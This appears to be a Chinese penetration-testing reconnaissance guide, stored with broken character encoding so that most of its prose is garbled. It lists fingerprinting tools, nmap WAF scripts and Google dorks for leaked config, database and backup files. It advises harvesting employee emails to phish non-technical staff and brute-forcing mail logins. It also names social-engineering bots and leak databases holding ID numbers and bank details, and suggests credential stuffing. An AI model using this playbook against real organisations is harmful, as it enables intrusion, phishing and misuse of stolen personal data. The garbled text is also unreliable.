CMSScanï¼šhttps://github.com/ajinabraham/CMSScan CMSmapï¼šhttps://github.com/Dionach/CMSmap è¿˜æœ‰ä¸€äº›å…¶ä»–ä¼˜ç§€Githubé¡¹ç›® CMSeeK CMSmap ACMSDiscovery TideFinger AngelSword æ•°å­—è§‚æ˜Ÿå¹³å° https://fp.shuziguanxing.com/#/ WAFè¯†åˆ« Wafä¹Ÿå«Webåº”ç”¨é˜²ç«å¢™ï¼Œæ˜¯é€šè¿‡æ‰§è¡Œä¸€ç³»åˆ—é’ˆå¯¹HTTP/HTTPSçš„å®‰å…¨ç­–ç•¥æ¥ä¸“é—¨ä¸ºWebåº”ç”¨æä¾›ä¿æŠ¤çš„ä¸€æ¬¾äº§å“ã€‚Wafçš„æ¢æµ‹å¾ˆå¤šäººéƒ½ä¼šå¿½ç•¥æ‰ ä¸»è¦æœ‰ä¸¤ç§æ‰‹æ³•å§ï¼Œä¸€ç§æ˜¯æ‰‹åŠ¨ï¼Œä¸€ç§æ˜¯å·¥å…·ï¼›çŸ¥é“äº†æ˜¯å¦æœ‰WAFï¼Œç”¨çš„ä»€ä¹ˆWAFï¼Œæˆ‘ä»¬æ‰å¥½å¯¹ç—‡ä¸‹è¯ æ‰‹åŠ¨çš„è¯ï¼šä¸€èˆ¬æ¥è¯´WAFéƒ½ä¼šæ‹¦æˆªæ•æ„Ÿæ–‡ä»¶ä¸‹è½½ï¼Œå¦‚a.sqlã€a.mdbç­‰ï¼Œç›´æ¥æ·»åŠ åˆ°ç½‘ç«™URLä¸­å³å¯ ä¸€äº›WAFå¯èƒ½ä¸é˜²æŠ¤è¿™äº›ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‹¿ä¸€äº›XSSã€SQLIçš„payloadæ¥æµ‹è¯•ä¹Ÿå¯ï¼ˆè´´ä¸ªå›¾ï¼‰ è¿˜æœ‰å°±æ˜¯é å·¥å…·è¯†åˆ«ï¼šwafw00fï¼šhttps://github.com/EnableSecurity/wafw00f è¿˜æœ‰Nmapç¥å™¨ï¼šæ¢æµ‹WAFæœ‰ä¸¤ç§è„šæœ¬ã€‚ ä¸€ç§æ˜¯http-waf-detectã€‚ nmap -p80,443 --script=http-waf-detect ip ä¸€ç§æ˜¯http-waf-fingerprintã€‚ nmap -p80,443 --script=http-waf-fingerprint ip 30å‡ æ¬¾å¸¸è§WAFçš„æ‹¦æˆªé¡µæ•´ç† å…¶ä»–åº”ç”¨æ”¶é›† å°ç¨‹åº ä¼æŸ¥æŸ¥ç­‰ï¼šæ‰¾åˆ°å°ç¨‹åºç‚¹å‡»å³å¯ å¾®ä¿¡APP æ”¯ä»˜å®APP å’Œå¾®ä¿¡ç±»ä¼¼ï¼Œä½†æ˜¯ä¸åŒå¹³å°å› ä¸ºä¸åŒçš„è§„åˆ™ï¼Œå¯èƒ½æœ‰ä¸€ç‚¹ç‚¹å·®å¼‚ â€”â€”è¿™é‡Œè´´ä¸ªåˆ«çš„å¸ˆå‚…çš„å›¾ å…¬ä¼—å· ä¼æŸ¥æŸ¥ï¼šhttps://www.qcc.com/ å¤©çœ¼æŸ¥ï¼šhttps://www.tianyancha.com/ ç›´æ¥æœç´¢ç›¸åº”å…¬å¸ï¼Œåœ¨èœå•æ ä¸­æ‰¾åˆ°å¾®ä¿¡å…¬ä¼—å· â€”â€”å’Œä¸Šé¢æŸ¥å°ç¨‹åºä¸€èˆ¬ ä¾æ—§è¿˜å¯ä»¥ç”¨å¾®ä¿¡æœç´¢ï¼Œè¿™é‡Œé‚£ä½å¸ˆå‚…è¯´è¿˜å¯ä»¥ç”¨æœç‹—å¾®ä¿¡ï¼šhttps://weixin.sogou.com/ â€”â€”ä½†æˆ‘æœä¸å‡ºæ¥ã€‚ã€‚ å…ˆè´´ä¸ªå›¾ ç”Ÿæ´»å· æ„Ÿè§‰æœ‰ç‚¹ç±»ä¼¼å¾®ä¿¡ä¸Šçš„å…¬ä¼—å·ï¼Œä¹Ÿæ˜¯é€šè¿‡æ”¯ä»˜å®APPæœç´¢å³å¯ APPæœé›† æ”¶é›†åˆ°APPï¼Œå¯ä»¥æµ‹æ­£å¸¸åŠŸèƒ½ï¼Œä¹Ÿå¯ä»¥å¯¹å®ƒè¿›è¡Œåç¼–è¯‘æŸ¥çœ‹æºç ï¼Œå¯èƒ½è·å–ä¸€äº›æ•æ„Ÿçš„æ¥å£ç­‰ä¿¡æ¯ã€‚ tipsï¼šä¸ä»…è¦æ”¶é›†æœ€æ–°ç‰ˆï¼Œè¿˜è¦æ”¶é›†å†å²ç‰ˆæœ¬çš„APPï¼Œå¯èƒ½å­˜åœ¨æ•æ„Ÿä¿¡æ¯ï¼Œä¹Ÿæœ‰å¯èƒ½å­˜åœ¨æœ‰æ¼æ´çš„å†å²æ¥å£ã€‚ ä¸ƒéº¦æ•°æ® https://www.qimai.cn/ ç›´æ¥æœç´¢å¯ä»¥è·å–åˆ°éƒ¨åˆ†ç›¸å…³çš„APP ä½†æ˜¯æœ‰äº›è¾ƒéšè—çš„APPç›´æ¥æœåå­—è¿˜æ˜¯æœä¸å‡ºæ¥ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±ä¼šç”¨åˆ°ä¸ƒéº¦ä¸€ä¸ªå¾ˆæ–¹ä¾¿çš„åŠŸèƒ½ï¼šåŒå¼€å‘è€…APP æ­¤å¤–ï¼Œè¿˜å¯ä»¥è·å–APPçš„å†å²ç‰ˆæœ¬ï¼Œå¯èƒ½é‡Œé¢å­˜åœ¨å¤§é‡çš„æ•æ„Ÿä¿¡æ¯!!! è±Œè±†èš ä½¿ç”¨è±Œè±†èšå¯ä»¥æ–¹ä¾¿çš„è·å–åˆ°APPçš„å†å²ç‰ˆæœ¬ï¼Œè¿™é‡Œå°±ç›´æ¥è´´å›¾äº† ä¼æŸ¥æŸ¥&amp;å¤©çœ¼æŸ¥â€”â€”ä¾æ—§ç±»ä¼¼ä¸Šé¢çš„å°ç¨‹åº App Store æœç´¢åˆ°åº”ç”¨å¾€ä¸‹æ»‘ï¼Œå…¶å®ä¹Ÿæ˜¯å’Œä¸ƒéº¦æ•°æ®æ‰¾åŒå¼€å‘è€…APPä¸€æ ·çš„ â€”â€”è´´å›¾ PCåº”ç”¨ çœ‹çœ‹å®¢æˆ·ç«¯çš„äº§å“ï¼Œå¯èƒ½æœ‰æ—¶å€™ä¹Ÿä¼šå‘ç°ä¸€äº›çªç ´å£ ä¸€èˆ¬æ¯”è¾ƒæ˜æ˜¾çš„å®˜ç½‘å°±å¯ä»¥ä¸‹è½½ï¼Œå¯èƒ½è¿˜æœ‰ä¸€äº›éšè—çš„PCåº”ç”¨ï¼Œæˆ–è€…æµ‹è¯•ç‰ˆï¼Œå°±éœ€è¦è‡ªå·±å»å¯»æ‰¾äº† æ•æ„Ÿæ–‡ä»¶ã€æ•æ„Ÿç›®å½•æ¢æµ‹ é€šå¸¸æˆ‘ä»¬æ‰€è¯´çš„æ•æ„Ÿæ–‡ä»¶ã€æ•æ„Ÿç›®å½•å¤§æ¦‚æœ‰ä»¥ä¸‹å‡ ç§ï¼š ï¼ˆ1ï¼‰Git ï¼ˆ2ï¼‰hg/Mercurial ï¼ˆ3ï¼‰svn/Subversion ï¼ˆ4ï¼‰bzr/Bazaar ï¼ˆ5ï¼‰Cvs ï¼ˆ6ï¼‰WEB-INFæ³„éœ² ï¼ˆ7ï¼‰å¤‡ä»½æ–‡ä»¶æ³„éœ²ã€é…ç½®æ–‡ä»¶æ³„éœ² æ•æ„Ÿæ–‡ä»¶ã€æ•æ„Ÿç›®å½•æŒ–æ˜ä¸€èˆ¬éƒ½æ˜¯é å·¥å…·ã€è„šæœ¬æ¥æ‰¾ï¼Œå½“ç„¶å¤§ä½¬æ‰‹å·¥ä¹Ÿèƒ½æ‰¾å¾—åˆ°ã€‚ è„šæœ¬å·¥å…· ï¼ˆ1ï¼‰å¾¡å‰‘ï¼ˆçœŸçš„å¾ˆä¸‡èƒ½ï¼Œæ–‡æœ«é™„ä¸Šå…¨å®¶æ¡¶ï¼‰ ï¼ˆ2ï¼‰çˆ¬è™«ï¼ˆAWVSã€Burpsuiteç­‰ï¼‰ ï¼ˆ3ï¼‰æœç´¢å¼•æ“ï¼ˆGoogleã€Githubç­‰ï¼‰ ï¼ˆ4ï¼‰wwwscan ï¼ˆ5ï¼‰BBscanï¼ˆä¸€ä½å·¨ä½¬å†™çš„pythonè„šæœ¬ï¼šhttps://github.com/lijiejie/BBScan ï¼ˆ6ï¼‰GSILï¼ˆä¹Ÿæ˜¯ä¸€ä½å·¨ä½¬å†™çš„pythonè„šæœ¬ï¼šhttps://github.com/FeeiCN/GSIL â€”â€”ä¸è¿‡è¿™ä¸ªå·¥å…·ä¼¼ä¹å­˜åœ¨é—®é¢˜ï¼Œæˆ‘é…ç½®ä¸æˆåŠŸ ï¼ˆ7ï¼‰ç¤¾äº¤å¹³å° Google hacking ç›®å½•éå†: site:$site intitle:index.of é…ç½®æ–‡ä»¶æ³„éœ²: site:$site ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini æ•°æ®åº“æ–‡ä»¶æ³„éœ²: site:$site ext:sql | ext:dbf | ext:mdb æ—¥å¿—æ–‡ä»¶æ³„éœ²: site:$site ext:log å¤‡ä»½å’Œå†å²æ–‡ä»¶: site:$site ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup ç™»å½•é¡µé¢: site:$site inurl:login SQLé”™è¯¯: site:$site intext:â€œsql syntax nearâ€ | intext:â€œsyntax error has occurredâ€ | intext:â€œincorrect syntax nearâ€ | intext:â€œunexpected end of SQL commandâ€ | intext:â€œWarning: mysql_connect()â€ | intext:â€œWarning: mysql_query()â€ | intext:â€œWarning: pg_connect()â€ å…¬å¼€æ–‡ä»¶ä¿¡æ¯: site:$site ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv phpinfo(): site:$site ext:php intitle:phpinfo â€œpublished by the PHP Groupâ€ æœç´¢ç²˜è´´ç«™ç‚¹: site:pastebin.com | site:paste2.org | site:pastehtml.com | site:slexy.org | site:snipplr.com | site:snipt.net | site:textsnip.com | site:bitpaste.app | site:justpaste.it | site:heypasteit.com | site:hastebin.com | site:dpaste.org | site:dpaste.com | site:codepad.org | site:jsitor.com | site:codepen.io | site:jsfiddle.net | site:dotnetfiddle.net | site:phpfiddle.org | site:ide.geeksforgeeks.org | site:repl.it | site:ideone.com | site:paste.debian.net | site:paste.org | site:paste.org.ru | site:codebeautify.org | site:codeshare.io | site:trello.com $site æœç´¢Githubã€Gitlab: site:github.com | site:gitlab.com $site. åœ¨çº¿Google Hackingåˆ©ç”¨ï¼šhttps://tools.zjun.info/googlehacking/ é’ˆå¯¹ä¿¡æ¯æ³„éœ²çš„æœç´¢å¼•æ“ https://leakix.net/ Google hacking database https://www.exploit-db.com/google-hacking-database ffuf é¡¹ç›®åœ°å€ï¼šhttps://github.com/ffuf/ffuf ffuf -w /path/to/wordlist -u https://target/FUZZ å­—å…¸éœ€è¦è‡ªå·±æ·»åŠ ï¼Œåœ¨éœ€è¦fuzzçš„åœ°æ–¹æ·»åŠ â€œFUZZâ€ dirmap https://github.com/H4ckForJob/dirmap æ”¯æŒé€’å½’æ‰«æã€åŠŸèƒ½å°†ä¼šå¼ºäºDirBusterã€Dirsearchã€cansinaã€å¾¡å‰‘ githubè¯­æ³• ä¸€äº›è¯­æ³• å‚è€ƒè‡ªï¼šhttps://github.com/obheda12/GitDorker/tree/master/Dorks æ‰€æœ‰è¯­æ³•txtç‰ˆ alldorksv3 medium_dorks è‡ªåŠ¨åŒ–å·¥å…·ï¼šhttps://github.com/damit5/gitdorks_go å†å²é¡µé¢ åœ¨çº¿ç½‘ç«™ï¼šhttps://web.archive.org/ waybackä¼šè®°å½•ç½‘ç«™ç‰ˆæœ¬æ›´è¿­ï¼Œå¯ä»¥è·å–åˆ°ä¹‹å‰ç‰ˆæœ¬çš„ç½‘ç«™ï¼Œå¯èƒ½ä¼šæ‰¾åˆ°ä¸€äº›åæ¥åˆ é™¤çš„æ•æ„Ÿèµ„äº§ä¿¡æ¯ï¼Œæˆ–è€…ä¸€äº›æ¼æ´ ä¸‹é¢æ˜¯2010å¹´çš„qq.comï¼ï¼ åœ¨æ¨èä¸¤æ¬¾å¼ºåŠ›å·¥å…·ï¼š gauï¼šhttps://github.com/lc/gau waybackurlsï¼šhttps://github.com/tomnomnom/waybackurls ç½‘ç›˜ä¿¡æ¯æœé›† æŸäº›å®‰å…¨æ„è¯†è–„å¼±çš„äººå‘˜å¯èƒ½ä¸Šä¼ èµ„æ–™åˆ°ä¸€äº›ç½‘ç›˜ä¸­ï¼Œæ²¡æœ‰åŠ å¯†ç æˆ–è€…å¯†ç æ³„éœ²ï¼Œç„¶åè¢«ä¸€äº›åœ¨çº¿äº‘ç›˜æŠ“å–æ”¶å½•äº†ï¼Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚ è¶…èƒ½æœï¼šhttps://www.chaonengsou.com/ ç™¾åº¦ç½‘ç›˜çˆ¬è™«ï¼šhttps://github.com/k1995/BaiduyunSpider é‚®ç®±ä¿¡æ¯æœé›† ç›®å‰æƒ…å†µæ¥çœ‹ï¼Œé€šè¿‡webæ‰“ç‚¹ä¸ä¸€å®šæ˜¯æœ€ä¼˜çš„æ–¹å¼ï¼Œå¯ä»¥ç¤¾å·¥ç­‰æ–¹å¼åŒæ­¥è¿›è¡Œï¼›å› æ­¤å°½å¯èƒ½å¤šçš„æ”¶é›†ç›®æ ‡çš„é‚®ç®±ï¼Œç„¶åè¿›è¡Œç¤¾å·¥é’“é±¼å¯èƒ½å¤§æœ‰çªç ´ å®é™…è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°½å¯èƒ½çš„æŠŠæ”¶é›†åˆ°ç–‘ä¼¼ç½‘ç»œç®¡ç†å‘˜ã€è¿ç»´äººå‘˜ã€å®‰å…¨éƒ¨é—¨çš„äººå‘˜æå–å‡ºæ¥ï¼Œè¿™äº›äººå•ç‹¬å†™é‚®ä»¶æˆ–è€…ä¸å‘ï¼Œå› ä¸ºè¿™äº›äººå®‰å…¨æ„è¯†ç›¸å¯¹è¾ƒé«˜ï¼Œå®¹æ˜“æ‰“è‰æƒŠè›‡ï¼Œæˆ‘ä»¬éœ€è¦å¯¹ä¸€äº›éæŠ€æœ¯å‘˜å·¥å®‰å…¨æ„è¯†è–„å¼±çš„äººä¸‹æ‰‹ï¼ŒæŒ‘è½¯æŸ¿å­æã€‚ å¯»æ‰¾ç›®æ ‡é‚®ç®±å…¥å£ ç›®æ ‡ä¸ºå¼€æ”¾çš„é‚®æœç«¯å£æˆ–webé‚®ç®±å…¥å£ æ‹¿åˆ°ç›®æ ‡åï¼Œå…ˆè¦å…ˆä»MXè®°å½•åŸŸåæ‰¾åˆ°ä»–çš„çœŸå®ipåœ°å€ï¼ˆæŸäº›ç›®æ ‡å¯èƒ½æ˜¯ç¬¬ä¸‰æ–¹é‚®ä»¶æœåŠ¡å™¨ï¼Œè¿™ç§æƒ…å†µmxè®°å½•å°±æ²¡æœ‰å‚è€ƒä»·å€¼äº†ï¼‰ ç„¶åé’ˆå¯¹è¿™ä¸ªipåœ°å€çš„Cæ®µè¿›è¡Œæ‰«æï¼ˆ25ã€109ã€110ã€143ã€465ã€995ã€993ç«¯å£ï¼‰ é€šè¿‡å­åŸŸå ä¸»è¦æ˜¯åˆ©ç”¨ä¸€äº›å­åŸŸåæ”¶é›†å·¥å…·ï¼Œå¦‚ï¼šSubdomainbruteã€ksubdomainã€Oneforallã€Sublist3rã€TeeMOã€LangSrcCuriseã€LayeræŒ–æ˜æœºç­‰ é€šè¿‡æœç´¢å¼•æ“ 1ã€Google Hackingè¯­æ³• site:target.com intitle:\"Outlook Web App\" site:target.com intitle:\"mail\" site:target.com intitle:\"é‚®ç®±\" 2ã€ç½‘ç»œç©ºé—´æœç´¢å¼•æ“ Shodan fofa zoomeye hostname:163.com http.title:\"é‚®ç®±\" åœ¨çº¿å¹³å°æœé›† é‚®ç®±æŸ¥æ‰¾å·¥å…·ï¼šhttps://app.snov.io/ https://phonebook.cz/ â€”â€”è¿˜å¯ä»¥æ”¶é›†åŸŸåä¸url https://hunter.io/ http://www.skymem.info/ https://www.email-format.com/i/search/ å·¥å…·æœé›† https://github.com/laramies/theHarvester â€”kaliè‡ªå¸¦ ä¸ç†è§£çš„æ˜¯ï¼Œæ€»æ˜¯æŸ¥ä¸å‡ºæ¥ï¼Œæ„Ÿè§‰æ˜¯apiçš„é—®é¢˜å§ã€‚ã€‚ã€‚ éªŒè¯é‚®ç®± åœ¨ç»è¿‡ä¸Šè¿°çš„é‚®ç®±æœé›†ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å¯¹é‚®ç®±è¿›è¡Œå­˜æ´»æ€§éªŒè¯ï¼Œæ£€æµ‹ç›®æ ‡é‚®ç®±æ˜¯å¦å­˜åœ¨è¢«å¼ƒç”¨çš„æƒ…å†µï¼ˆç¦»èŒï¼ŒèŒä½è°ƒåŠ¨ç­‰ï¼‰ã€‚ é€šè¿‡mailtester.com ï¼šhttps://mailtester.com/ é‚®ç®±çˆ†ç ´ è¿™ç§æ–¹å¼çš„å¼±å£ä»¤çˆ†ç ´åªé€‚ç”¨äºç›®æ ‡ä¼ä¸šè‡ªå·±çš„é‚®ä»¶æœåŠ¡å™¨å¦‚owaç­‰ åƒç™¾åº¦è…¾è®¯é˜¿é‡Œç½‘æ˜“ç­‰ç¬¬ä¸‰æ–¹é‚®ç®±ä¸ä¼˜å…ˆè€ƒè™‘ SMTPåè®®çˆ†ç ´ï¼šmedusaã€hydraã€SNETCrackerã€APT34ç»„ç»‡ owaçˆ†ç ´å·¥å…·ç­‰â€¦ ç½‘é¡µé‚®ç®±çˆ†ç ´ï¼šburpsuiteç­‰â€¦ JSä¿¡æ¯æœé›† åœ¨JSä¸­å¯èƒ½ä¼šå­˜åœ¨å¤§é‡çš„æ•æ„Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼š æŸäº›æœåŠ¡çš„æ¥å£ï¼Œå¯ä»¥æµ‹è¯•è¿™äº›æ¥å£æ˜¯å¦æœ‰æœªæˆæƒç­‰ å­åŸŸåï¼Œå¯èƒ½åŒ…å«æœ‰ä¸å¸¸è§æˆ–è€…å­åŸŸåæ”¶é›†è¿‡ç¨‹ä¸­æ²¡æ”¶é›†åˆ°çš„ç›®æ ‡ å¯†ç ã€secretKeyç­‰æ•æ„Ÿæ•°æ® æ‰‹å·¥æœé›† å¯ä»¥å…¨å±€æœç´¢httpã€\"/ã€è¿™ç§å…³é”®è¯ åˆ©ç”¨å·¥å…· JSFinder https://github.com/Threezh1/JSFinder JSFinderæ˜¯ä¸€æ¬¾ç”¨ä½œå¿«é€Ÿåœ¨ç½‘ç«™çš„jsæ–‡ä»¶ä¸­æå–URLï¼Œå­åŸŸåçš„å·¥å…·ç”¨æ³•å‚è€ƒé¡¹ç›®æ–‡æ¡£ï¼Œæˆ–è€…-h python JSFinder.py -u http://www.jd.com ---ç®€å•çˆ¬å– LinkFinder https://github.com/GerbenJavado/LinkFinder è¿™ä¹Ÿæ˜¯ä¸€æ¬¾ä¸€ç›´åœ¨ç”¨çš„å·¥å…·ï¼Œæ•ˆæœæ æ çš„ï¼Œå¯ä»¥æœ¬åœ°ç”¨ï¼Œä¹Ÿå¯ä»¥é›†æˆåˆ°Burpæ’ä»¶é‡Œé¢ Hae https://github.com/gh0stkey/HaE HaEæ˜¯åŸºäº BurpSuite æ’ä»¶ JavaAPI å¼€å‘çš„è¯·æ±‚é«˜äº®æ ‡è®°ä¸ä¿¡æ¯æå–çš„è¾…åŠ©å‹æ’ä»¶ã€‚åŸºäºæ­£åˆ™è¡¨è¾¾å¼ï¼Œé™¤äº†æå–æ•æ„Ÿä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥æå–é¡µé¢ä¸­çš„é“¾æ¥ç­‰ è´´ä¸ªå›¾ï¼š ç¤¾ä¼šå·¥ç¨‹å­¦ ç¤¾ä¼šå·¥ç¨‹å­¦æ”¶é›†çš„ä¿¡æ¯æœ‰å¾ˆå¤šï¼ŒåŒ…å«ç½‘ç»œ IDï¼ˆç°ç”¨å’Œæ›¾ç”¨ï¼‰ã€çœŸå®å§“åã€æ‰‹æœºå·ã€ç”µå­é‚®ç®±ã€å‡ºç”Ÿæ—¥æœŸã€èº«ä»½è¯å·ã€é“¶è¡Œå¡ã€æ”¯ä»˜å®è´¦å·ã€QQ å·ã€å¾®ä¿¡å·ã€å®¶åº­åœ°å€ã€æ³¨å†Œç½‘ç«™ï¼ˆè´´å§ã€å¾®åšã€äººäººç½‘ç­‰ï¼‰ç­‰ä¿¡æ¯ã€‚ åœ¨ç›®æ ‡ç›¸å…³ç½‘é¡µä¸­å¯èƒ½ä¼šå­˜åœ¨æ‹›è˜ä¿¡æ¯ã€å®¢æœè”ç³»ç­‰ï¼Œå¯ä»¥åˆ©ç”¨æ‹›è˜æˆ–å®¢æœèŠå¤©çš„æ–¹å¼è¿›è¡Œé’“é±¼ã€æœ¨é©¬æ¤å…¥ç­‰ã€‚ æœé›†åˆ°ç›¸å…³çš„äººå‘˜ä¿¡æ¯åå¯ä»¥åˆ¶ä½œç¤¾å·¥å­—å…¸ï¼Œæœ‰å¦‚ä¸‹åœ¨çº¿æˆ–æœ¬åœ°å·¥å…·ï¼š bugkuå¯†ç æ”»å‡»å™¨ï¼šhttps://www.bugku.com/mima/ ç™½é¹¿ç¤¾å·¥å­—å…¸ç”Ÿæˆå™¨ï¼šhttps://github.com/z3r023/BaiLu-SED-Tool è¿˜æœ‰ä¸€äº›ç¤¾å·¥æœºå™¨äººï¼š ç‹—ç‹—å…è´¹ç¤¾å·¥æœºå™¨äºº DATA007 å¹³å®‰ç¤¾å·¥åº“ AISGKï¼šæ•°æ®ç›¸å¯¹æ¯”è¾ƒå…¨ï¼Œä½†æ˜¯éœ€è¦æ¨å¹¿ä¸€å®šäººæ‰èƒ½ç”¨ï¼ ç¤¾å·¥å¯†ç ç”Ÿæˆï¼šhttps://github.com/zgjx6/SocialEngineeringDictionaryGenerator ç›®æ ‡åŸŸåé‚®ç®±æ”¶é›† ä¸€å®šè¦å…»æˆæ”¶é›†ç«™ç‚¹é‚®ç®±è´¦å·æ”¶é›†çš„ä¹ æƒ¯ï¼ˆå› ä¸ºå¥½å¤šå®˜æ–¹åå°éƒ½æ˜¯ç”¨å†…éƒ¨é‚®ç®±è´¦å·ç™»å½•çš„ï¼ŒæŒ‡ä¸å®šå“ªå¤©ä½ å°±å¾—åˆ°ä¸€ä¸ªè¿›åå°çš„æœºä¼šï¼‰ã€‚ ï¼ˆ1ï¼‰é€šè¿‡è¯´æ˜æ–‡æ¡£ä»¥åŠç½‘ç«™é¡µé¢æ”¶é›†ï¼Œæˆ–è€…ç½‘ç«™å‘è¡¨è€…ä»¥åŠç•™è¨€æ¿ä¿¡æ¯å¤„æ”¶é›†è´¦å· ï¼ˆ2ï¼‰é€šè¿‡ teemoï¼Œmetagoï¼Œburpusitï¼Œawvsï¼Œnetspker æˆ–è€… google è¯­æ³•æ”¶é›† ï¼ˆ3ï¼‰æœç´¢ç›¸å…³ QQ ç¾¤æ”¶é›†ç›¸å…³ä¼ä¸šå‘˜å·¥çš„ç¤¾äº¤è´¦å· ç”¨é€”ï¼š å¯ç”¨æ¥è¿›è¡Œçˆ†ç ´æˆ–è€…å¼±å£ä»¤ç™»å½•ä»¥åŠæ’è£¤æ”»å‡»ã€‚ 0x04 å¤–ç½‘æ‰“ç‚¹åŸºæœ¬æµç¨‹ ç»è¿‡ä»¥ä¸Šçš„å­¦ä¹ ï¼Œæ¥ä¸‹æ¥è·Ÿç€æ–‡ç« æ¢³ç†ä¸€éæ‰“ç‚¹çš„æµç¨‹ Step One ä¸»åŸŸåæ”¶é›† å…ˆæ”¶é›†ç›®æ ‡çš„å„ç§ä¸»åŸŸåï¼ˆåŒ…æ‹¬å­å…¬å¸ã€appã€å°ç¨‹åºã€å…¬ä¼—å·ç­‰ï¼‰ å·¥å…·ï¼šå¤‡æ¡ˆåæŸ¥åŸŸå(icp_domansç­‰)ã€ä¼æŸ¥æŸ¥ã€â€¦ æ”¶é›†å­åŸŸå é…ç½®å¥½apiçš„oneforall ã€masscanã€fscanç­‰ç­‰å·¥å…·ï¼Œè·å¾—æ¯”è¾ƒå…¨çš„å­åŸŸå è·å–çœŸå®IPä¸Cæ®µ å¯¹äºå­åŸŸåï¼Œè·å–å…¶çœŸå®ipå’ŒCæ®µ ï¼ˆCæ®µé‡å¤§ã€æ¯”è¾ƒåˆ†æ•£çš„è¯ï¼Œå¯ä»¥æ”¾åˆ°åé¢å†çœ‹ï¼‰ å¯èƒ½å¾ˆå¤§ä¸€éƒ¨åˆ†ipæ˜¯CDNï¼Œå¿«é€Ÿè¿‡æ»¤æ‰CDN ip,ä»¥åŠåšä¸€äº›ç®€å•çš„ç»•è¿‡ï¼ˆæ—¶é—´å……è¶³çš„è¯ï¼Œå¯¹é‡ç‚¹åŸŸåè¯¦ç»†ç»•è¿‡ï¼Œå¯»æ‰¾çœŸå®ip) å·¥å…·ï¼š Eeyesï¼ˆå¿«é€Ÿç­›é€‰çœŸå®IPå¹¶æ•´ç†ä¸ºCæ®µ,ç½‘ç»œæ¡ä»¶å¥½çš„è¯ï¼Œå‡†ç¡®ç‡æŒºé«˜çš„ï¼‰ fcdn https://github.com/ccc-f/FCDN https://github.com/mabangde/cdncheck_cn å›½å¤–å¯ä»¥ä½¿ç”¨cdncheckï¼šï¼ˆå¯æ£€æµ‹CDNã€WAFã€äº‘ï¼Œå›½å†…åŸºæœ¬æ²¡å•¥ç”¨ï¼‰ type ip.txt | cdncheck.exe -resp -cdn (å†è¿‡æ»¤ä¸€éEeyesè¾“å‡ºçš„çœŸå®ipç»“æœ) è·å–å¯¹åº”çš„èµ„äº§ è·å–ipå’ŒCæ®µä¿¡æ¯å¯¹åº”çš„èµ„äº§ é€šè¿‡fofaç­‰å¿«é€Ÿè·å–ipå’ŒCæ®µä¿¡æ¯å¯¹åº”çš„èµ„äº§ (ç›¸å…³å·¥å…·ï¼šhttps://github.com/zhizhuoshuma/Assetstocollect ) å†é€šè¿‡fofaè¯­æ³•æœä¸€éä¸»åŸŸå¯¹åº”çš„èµ„äº§ä¿¡æ¯ï¼š domain=\"xxx.com\" æ—¶é—´å……è¶³çš„è¯ï¼Œå¯¹ipå’ŒCæ®µä¿¡æ¯è¿›è¡Œå…¨ç«¯å£æ‰«æï¼Œè·å–æ›´å¤šèµ„äº§ å­åŸŸåæ¢æ´» å¯¹å­åŸŸåè¿›è¡Œæ¢æ´»ï¼Œè·å–webèµ„äº§ä¿¡æ¯ httpx ç­‰ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸‹å¸¸ç”¨çš„ç«¯å£ æ¢æ´»æœ‰æ—¶å€™ä¸å¤ªå‡†ç¡®ï¼Œæ¼æ‰ä¸€äº›ï¼Œå¯ä»¥å°†æ‰€æœ‰å­åŸŸå‰é¢å¢åŠ `http://` `https://` è¿›è¡Œä¸€éè¯†åˆ« æ¢æ´»å¯ä»¥è·ŸæŒ‡çº¹è¯†åˆ«ä¸€èµ·è¿›è¡Œ æ•´ç†èµ„äº§ï¼ŒæŒ‡çº¹è¯†åˆ« æ•´åˆæ‰€æœ‰webèµ„äº§ï¼Œè¿›è¡ŒæŒ‡çº¹è¯†åˆ« é€šè¿‡å­åŸŸåè·å¾—çš„webèµ„äº§ + fofa ip/Cæ®µ(ip=\"1.1.1.1\" or ip=\"1.1.1.1/24\") + fofa domain=\"xxx.com\"ç­‰ç­‰ è·å¾—çš„webèµ„äº§è¿›è¡Œæ•´åˆ æ•´åˆåé€šè¿‡ ehole(æ‰©å……æŒ‡çº¹) ç­‰ï¼Œè¿›è¡ŒæŒ‡çº¹è¯†åˆ« äº‘æºªã€wappalyzergoã€tidefinger ï¼ˆåªèƒ½å•ä¸ªurlï¼‰ webèµ„äº§æ¼æ‰« æ ¹æ®ç›®æ ‡çš„é˜²æŠ¤æƒ…å†µï¼Œé€‰æ‹©æ¼æ‰«å·¥å…·ï¼š å¿«é€Ÿï¼šfscan å®Œå¤‡ï¼š 1ã€nuclei æ•´åˆPOCï¼š è‡ªå¸¦ æ•´åˆä¸€äº›å…¶ä»–çš„ çˆ¬è™«(katanaç­‰ï¼‰+fuzzing-templatesï¼ˆhttps://github.com/projectdiscovery/fuzzing- templatesï¼‰ or https://github.com/0xKayala/NucleiFuzzer 2ã€afrog (1000ä¸ªå·¦å³poc) 3ã€çˆ¬è™«+xray è¡¥å……ï¼š vscanã€sweetbaby IPå’ŒCæ®µçš„é«˜å±ç«¯å£åˆ©ç”¨ ä¸€äº›éwebç«¯å£ï¼Œå¦‚ftp ssh å„ç§æ•°æ®åº“ rdp ä¹‹ç±»çš„ å¼±å£ä»¤ã€å†å²æ¼æ´ webèµ„äº§ç›®å½•æ‰«æ dirsearch ï¼Œå¯ä»¥å…ˆåªæ‰«200ï¼Œå¯ä»¥åœ¨å‰é¢å°±å…ˆæŒ‚ä¸Š å¤‡ä»½æ–‡ä»¶æ‰«æï¼ˆä¸»è¦é’ˆå¯¹ä¸€äº›è‡ªå»ºçš„ç«™ï¼‰ é’ˆå¯¹é‡ç‚¹èµ„äº§ï¼Œæ‰‹å·¥æµ‹è¯•çš„æ—¶å€™å†è¿›è¡Œæ·±å…¥æ‰«æ æ•æ„ŸWebèµ„äº§ï¼Œæ·±å…¥æŒ–æ˜ 